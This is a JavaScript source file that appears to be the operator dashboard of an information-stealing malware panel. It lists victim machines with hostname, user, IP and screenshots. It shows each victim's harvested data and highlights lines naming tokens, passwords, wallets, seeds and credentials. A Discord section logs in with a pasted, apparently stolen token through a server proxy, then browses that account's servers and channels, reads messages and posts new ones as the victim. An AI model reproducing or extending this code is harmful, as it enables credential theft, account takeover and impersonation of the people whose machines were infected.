let clients = []
let selected = null
let searchterm = ''

function refr() {
  fetch('/api/clients').then(r => r.json()).then(list => {
    clients = list
    render()
    if (selected && !clients.find(c => c.id === selected)) {
      selected = null
      document.getElementById('detail').classList.remove('show')
    }
    document.getElementById('sbstats').textContent = clients.length
  })
}

function render() {
  const el = document.getElementById('clientlist')
  const filtered = clients.filter(c => !searchterm || c.hostname.toLowerCase().includes(searchterm) || (c.user || '').toLowerCase().includes(searchterm) || (c.ip || '').toLowerCase().includes(searchterm))
  if (filtered.length === 0) {
    el.innerHTML = '<div class="empty">' + (searchterm ? 'no match' : 'no clients yet') + '</div>'
    return
  }
  el.innerHTML = ''
  for (const c of filtered) {
    const div = document.createElement('div')
    div.className = 'client' + (c.id === selected ? ' active' : '')
    const tags = []
    if (c.has_ss) tags.push('<span class="ctag ss">ss</span>')
    div.innerHTML = `<div class="chost">${esc(c.hostname)} ${tags.join('')}</div><div class="cmeta"><span>${esc(c.user || '?')}</span><span>${esc(c.ip || '?')}</span><span>${reltime(c.time)}</span></div>`
    div.onclick = () => showdetail(c.id)
    el.appendChild(div)
  }
  if (selected) {
    const sel = el.querySelector('.client.active')
    if (sel) sel.scrollIntoView({ block: 'nearest', behavior: 'smooth' })
  }
}

function showdetail(id) {
  selected = id
  render()
  fetch('/api/client/' + id).then(r => r.json()).then(data => {
    const wel = document.getElementById('welcome')
    if (wel) wel.style.display = 'none'
    const el = document.getElementById('detail')
    el.className = 'show'
    let html = '<div class="dhead"><h2>' + esc(data.hostname) + '</h2><div class="dbtns"><button onclick="copyall(\'' + id + '\')">copy</button><button class="del" onclick="delclient(\'' + id + '\')">delete</button></div></div>'
    html += '<div class="dmeta"><div class="dm"><strong>user</strong> ' + esc(data.user) + '</div><div class="dm"><strong>ip</strong> ' + esc(data.ip || '?') + '</div><div class="dm"><strong>time</strong> ' + new Date(data.time).toLocaleString() + '</div></div>'
    if (data.screenshot) {
      html += '<div class="dss" onclick="window.open(this.querySelector(\'img\').src)"><img src="data:image/png;base64,' + data.screenshot + '"></div>'
    }
    html += '<div class="ddata">' + fmtd(data.data || '') + '</div>'
    el.innerHTML = html
  })
}

function fmtd(text) {
  if (!text) return ''
  return esc(text).split('\n').map(l => {
    if (/^===/.test(l)) return '<div class="sechead">' + esc(l.replace(/=/g, '').trim()) + '</div>'
    if (/token|password|pass|key|secret|wallet|seed|credential|auth/i.test(l)) return '<div class="hit">' + esc(l) + '</div>'
    return esc(l)
  }).join('\n')
}

function delclient(id) {
  if (!confirm('delete ' + id + '?')) return
  fetch('/api/delete/' + id).then(() => {
    if (selected === id) { selected = null; document.getElementById('detail').classList.remove('show') }
    refr()
  })
}

function clearall() {
  if (!confirm('clear all data?')) return
  fetch('/api/clearlog').then(refr)
}

function onsearch() {
  searchterm = document.getElementById('search').value.toLowerCase()
  render()
}

function copyall(id) {
  fetch('/api/client/' + id).then(r => r.json()).then(data => {
    const txt = data.data || ''
    navigator.clipboard.writeText(txt).then(() => toast('copied to clipboard'))
  })
}

function toast(msg) {
  const el = document.createElement('div')
  el.className = 'toast'
  el.textContent = msg
  document.getElementById('toasts').appendChild(el)
  setTimeout(() => el.remove(), 3500)
}

function esc(s) {
  const d = document.createElement('div')
  d.textContent = s || ''
  return d.innerHTML
}

function reltime(iso) {
  const diff = Date.now() - new Date(iso).getTime()
  if (diff < 60000) return 'now'
  if (diff < 3600000) return Math.floor(diff / 60000) + 'm'
  if (diff < 86400000) return Math.floor(diff / 3600000) + 'h'
  return Math.floor(diff / 86400000) + 'd'
}

let dcToken = ''
let dcUser = null
let dcGuilds = []
let dcSelectedGuild = null
let dcSelectedChannel = null
let dcChannels = []
let dcMessages = []

function switchTab(name) {
  document.querySelectorAll('.stab').forEach(b => b.classList.toggle('active', b.dataset.tab === name))
  document.getElementById('tab-clients').style.display = name === 'clients' ? '' : 'none'
  const ttab = document.getElementById('tab-token')
  ttab.style.display = name === 'token' ? '' : 'none'
  ttab.classList.toggle('active', name === 'token')
  document.getElementById('welcome').style.display = name === 'clients' ? '' : 'none'
  document.getElementById('detail').classList.toggle('show', false)
  document.getElementById('dcClient').style.display = 'none'
  if (name === 'token' && dcToken && dcUser) {
    document.getElementById('dcClient').style.display = 'flex'
  }
}

async function dcProxy(method, path, body) {
  const r = await fetch('/api/discord/proxy', {
    method: 'POST', headers: { 'Content-Type': 'application/json' },
    body: JSON.stringify({ token: dcToken, method, path, dbody: body || undefined })
  })
  const j = await r.json()
  if (j.ok) return j.data
  throw new Error(j.data && j.data.message ? j.data.message : 'request failed')
}

async function discordLogin() {
  const token = document.getElementById('tokenInput').value.trim()
  if (!token) { toast('paste a token first'); return }
  const status = document.getElementById('tokenStatus')
  status.textContent = 'connecting...'
  status.style.color = '#888'
  try {
    const r = await fetch('/api/discord/lookup', { method: 'POST', headers: { 'Content-Type': 'application/json' }, body: JSON.stringify({ token }) })
    const j = await r.json()
    if (!j.ok) { status.textContent = j.error || 'invalid token'; status.style.color = '#e94560'; return }
    const d = j.data
    dcToken = token
    dcUser = d.user
    dcGuilds = d.guilds || []
    const u = d.user
    status.textContent = '✓ ' + esc(u.username || 'connected')
    status.style.color = '#44cc88'
    document.getElementById('dcHeader').textContent = esc(u.username) + '#' + (u.discriminator || '0') + ' — ' + dcGuilds.length + ' guilds'
    document.getElementById('dcClient').style.display = 'flex'
    document.getElementById('welcome').style.display = 'none'
    renderGuildList()
  } catch (e) {
    status.textContent = 'error: ' + e.message
    status.style.color = '#e94560'
  }
}

function renderGuildList() {
  const el = document.getElementById('dcGuildList')
  el.innerHTML = ''
  for (const g of dcGuilds) {
    const div = document.createElement('div')
    div.className = 'dc-guild' + (dcSelectedGuild === g.id ? ' active' : '')
    const owner = g.owner ? ' ★' : ''
    div.innerHTML = '<div class="gname">' + esc(g.name) + owner + '</div><div class="gmeta">' + (g.approximate_member_count || '?') + ' members</div>'
    div.onclick = () => selectGuild(g.id)
    el.appendChild(div)
  }
}

async function selectGuild(gid) {
  dcSelectedGuild = gid
  dcSelectedChannel = null
  dcMessages = []
  renderGuildList()
  document.getElementById('dcMessages').innerHTML = '<div style="color:#444;padding:20px;text-align:center">loading channels...</div>'
  document.getElementById('dcInputArea').style.display = 'none'
  try {
    const guild = dcGuilds.find(g => g.id === gid)
    const gname = guild ? guild.name : '?'
    document.getElementById('dcHeader').textContent = esc(dcUser.username) + '#' + (dcUser.discriminator || '0') + ' — ' + esc(gname)
    dcChannels = await dcProxy('GET', '/api/v9/guilds/' + gid + '/channels')
    renderChannelList()
  } catch (e) {
    document.getElementById('dcMessages').innerHTML = '<div style="color:#e94560;padding:20px;text-align:center">' + esc(e.message) + '</div>'
  }
}

function renderChannelList() {
  const el = document.getElementById('dcChannelList')
  el.innerHTML = ''
  const textChannels = dcChannels.filter(c => c.type === 0)
  for (const c of textChannels) {
    const span = document.createElement('span')
    span.className = 'dc-channel' + (dcSelectedChannel === c.id ? ' active' : '')
    span.textContent = '# ' + c.name
    span.onclick = () => selectChannel(c.id)
    el.appendChild(span)
  }
  if (textChannels.length === 0) el.innerHTML = '<span style="color:#444;padding:8px;font-size:12px">no text channels</span>'
}

async function selectChannel(cid) {
  dcSelectedChannel = cid
  dcMessages = []
  renderChannelList()
  const el = document.getElementById('dcMessages')
  el.innerHTML = '<div style="color:#444;padding:20px;text-align:center">loading messages...</div>'
  document.getElementById('dcInputArea').style.display = 'flex'
  try {
    dcMessages = await dcProxy('GET', '/api/v9/channels/' + cid + '/messages?limit=50')
    renderMessages()
  } catch (e) {
    el.innerHTML = '<div style="color:#e94560;padding:20px;text-align:center">' + esc(e.message) + '</div>'
  }
}

function renderMessages() {
  const el = document.getElementById('dcMessages')
  let html = ''
  for (const m of dcMessages.slice().reverse()) {
    const author = m.author ? m.author.username : '?'
    const time = new Date(m.timestamp).toLocaleTimeString()
    let content = esc(m.content || '')
    if (m.attachments && m.attachments.length > 0) {
      for (const a of m.attachments) content += ' [attachment: ' + esc(a.filename) + ']'
    }
    html += '<div class="dc-msg"><span class="mauthor">' + esc(author) + '</span><span class="mtime">' + time + '</span><div class="mcontent">' + content + '</div></div>'
  }
  if (!html) html = '<div style="color:#444;text-align:center;padding:20px">no messages</div>'
  el.innerHTML = html
  el.scrollTop = el.scrollHeight
}

async function dcSendMsg() {
  const input = document.getElementById('dcMsgInput')
  const text = input.value.trim()
  if (!text || !dcSelectedChannel) return
  input.value = ''
  try {
    const msg = await dcProxy('POST', '/api/v9/channels/' + dcSelectedChannel + '/messages', { content: text })
    dcMessages.push(msg)
    renderMessages()
  } catch (e) {
    toast('send failed: ' + e.message)
  }
}

if (window.EventSource) {
  const sse = new EventSource('/api/sse')
  sse.addEventListener('newclient', e => {
    const d = JSON.parse(e.data)
    refr()
    if (!document.hidden) toast('new: ' + d.hostname)
  })
  sse.addEventListener('deleted', e => refr())
  sse.addEventListener('cleared', e => refr())
  sse.addEventListener('connected', () => refr())
  sse.onerror = () => {}
}

refr()
setInterval(refr, 15000)
